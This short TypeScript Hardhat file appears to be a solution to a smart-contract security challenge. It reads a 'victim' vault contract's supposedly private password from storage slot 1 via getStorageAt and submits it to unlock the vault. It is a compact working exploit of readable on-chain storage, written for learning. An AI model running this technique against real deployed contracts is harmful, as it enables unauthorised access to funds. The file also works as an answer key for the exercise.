import { expect } from "chai";
import { ethers, waffle } from "hardhat";

const helper = async (victim: any) => {
  /* 
    Add code here that will help you pass the test
    Note: Unlock without using the string "A very strong password"
    Unlock the vault by somehow reading the private password from 
    Vault directly
  */
  const storageLocation = await ethers.provider.getStorageAt(victim.address, '0x1');

  console.log(storageLocation);

  const password = ethers.utils.toUtf8String(storageLocation);
  
  console.log(password);

  await victim.unlock(storageLocation);

};

export default helper;

// Plan:
// Grab & decode the data at the appropriate storage slot to get the password using ethers.js
// Submit an unlock tx using the resulting string as the password